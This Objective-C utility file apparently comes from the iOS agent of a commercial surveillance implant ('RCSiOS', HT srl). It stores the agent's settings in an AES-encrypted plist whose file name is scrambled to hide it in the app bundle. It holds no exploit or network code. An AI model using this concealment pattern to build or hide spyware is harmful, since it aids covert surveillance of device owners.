/*
 * RCSiOS - Utils and stuff
 *
 *
 * Created on 08/09/2009
 * Copyright (C) HT srl 2009. All rights reserved
 *
 */

#import <fcntl.h>
#import <CommonCrypto/CommonDigest.h>

#import "RCSIUtils.h"

#import "RCSIGlobals.h"
#import "RCSICommon.h"
#import "RCSIEncryption.h"
#import "NSMutableData+AES128.h"

static _i_Utils *sharedInstance = nil;

//#define DEBUG
#define RCS_PLIST     @"_i_phone.plist"

@implementation _i_Utils

#pragma mark -
#pragma mark Class and init methods
#pragma mark -

+ (_i_Utils *)sharedInstance
{
  @synchronized(self)
  {
    if (sharedInstance == nil)
    {
      //
      // Assignment is not done here
      //
      [[self alloc] init];
    }
  }
  
  return sharedInstance;
}

+ (id)allocWithZone: (NSZone *)aZone
{
  @synchronized(self)
  {
    if (sharedInstance == nil)
    {
      sharedInstance = [super allocWithZone: aZone];
      
      //
      // Assignment and return on first allocation
      //
      return sharedInstance;
    }
  }
  
  // On subsequent allocation attemps return nil
  return nil;
}

- (id)copyWithZone: (NSZone *)aZone
{
  return self;
}

- (id)init
{
  Class myClass = [self class];
  
  @synchronized(myClass)
  {
    if (sharedInstance != nil)
    {
      self = [super init];
      
      if (self != nil)
      {

      }
      
      sharedInstance = self;
    }
  }
  
  return sharedInstance;
}

- (id)retain
{
  return self;
}

- (unsigned)retainCount
{
  // Denotes an object that cannot be released
  return UINT_MAX;
}

- (void)release
{
  // Do nothing
}

- (id)autorelease
{
  return self;
}

#pragma mark -
#pragma mark Agent property methods
#pragma mark -

- (NSMutableDictionary*)openPropertyFile
{
  NSMutableDictionary *retDict;
  NSString             *error = nil;
  NSPropertyListFormat format;
  int                  len;
  unsigned char        *buffer;
  NSRange              range;
  
  // Using the config aes key
  NSData *keyData = [NSData dataWithBytes: gConfAesKey
                                   length: CC_MD5_DIGEST_LENGTH];
  
  _i_Encryption *rcsEnc = [[_i_Encryption alloc] initWithKey: keyData];
  NSString *sFileName = [NSString stringWithString: [rcsEnc scrambleForward: RCS_PLIST seed: 1]];
  [rcsEnc release];
  
  NSString *pFilePath = [[NSBundle mainBundle] bundlePath];
  NSString *pFileName = [pFilePath stringByAppendingPathComponent: sFileName];
  
  if (![[NSFileManager defaultManager] fileExistsAtPath: pFileName])
    return nil;
  
  // The enc plist
  NSData *pListData = [[NSFileManager defaultManager] contentsAtPath: pFileName];
  
  // Space for enc data
  NSMutableData *tempData = [[NSMutableData alloc] initWithLength: [pListData length] - sizeof(int)];
  buffer = (unsigned char *)[tempData bytes];
  
  // Extract the unpadded length
  range.location = sizeof(int);
  range.length   = [pListData length] - sizeof(int);
  [pListData getBytes: &len length: sizeof(int)];
  
  // Extract the prop list
  [pListData getBytes: (void *)buffer range: range];
  NSMutableData *ePropData = [NSMutableData dataWithBytes: buffer length: range.length];
  
  [tempData release];
  
  // Decrypt it
  if ([ePropData decryptWithKey: keyData] != 0)
  {
    return nil;
  }
  // Save unpadded len bytes
  NSData *dPlistData = [NSData dataWithBytes: [ePropData bytes] length: len];
  
  // Create the plist dict
  retDict = (NSMutableDictionary *) [NSPropertyListSerialization propertyListFromData: dPlistData
                                                                     mutabilityOption: NSPropertyListMutableContainers
                                                                               format: &format
                                                                     errorDescription: &error];
  return retDict;
}

- (id)getPropertyWithName:(NSString*)name
{
  NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];
  
  id dict = nil;
  
  NSDictionary *temp = [self openPropertyFile];
  
  if (temp == nil)
  {
    [pool release];
    return nil;
  }
  
  dict = (id)[[temp objectForKey: name] retain];
  
  [pool release];
  
  return dict;
}

- (BOOL)setPropertyWithName:(NSString*)name
             withDictionary:(NSDictionary*)dictionary
{
  NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];
  
  NSString      *error = nil;
  NSRange       range;
  NSMutableData *propData;
  
  NSData *keyData = [NSData dataWithBytes: gConfAesKey
                                   length: CC_MD5_DIGEST_LENGTH];
  
  // Scrambled name
  _i_Encryption *rcsEnc = [[_i_Encryption alloc] initWithKey: keyData];
  NSString *sFileName = [NSString stringWithString: [rcsEnc scrambleForward: RCS_PLIST seed: 1]];
  [rcsEnc release];
  
  NSString *pFilePath = [[NSBundle mainBundle] bundlePath];
  NSString *pFileName = [pFilePath stringByAppendingPathComponent: sFileName];
  
  @synchronized(self)
  {
    // Try to open existing plist
    NSMutableDictionary *temp = [self openPropertyFile];
    
    if (temp == nil)
    {
      temp = (NSMutableDictionary *) dictionary;
    }
    else
    {
      if ([temp objectForKey: name] != nil)
      {
        [temp removeObjectForKey: name];
        [temp setObject: [dictionary objectForKey: name] forKey: name];
      }
      else
      {
        [temp addEntriesFromDictionary: dictionary];
      }
    }
    
    NSData *pListData = [NSPropertyListSerialization dataFromPropertyList: temp
                                                                   format: NSPropertyListXMLFormat_v1_0
                                                         errorDescription: &error];    
    // Unpadded length
    int len = [pListData length];
    
    // Try the encryption
    if ([((NSMutableData *)pListData) encryptWithKey: keyData] == 0)
    {
      // init the data with enc plist + (int)len
      propData = [[NSMutableData alloc] initWithCapacity: sizeof(int) + [pListData length]];
      
      // write down the unpadded len
      range.location = 0;
      range.length = sizeof(int);
      [propData replaceBytesInRange: range withBytes: (const void *) &len];
      
      // and the encrypted prop list
      range.location = sizeof(int);
      range.length = [pListData length];
      [propData replaceBytesInRange: range withBytes: [pListData bytes]];
      
      [propData writeToFile: pFileName atomically: YES];
      
      [propData release];
    }
  }
  [pool release];
  
  return YES;
}

@end
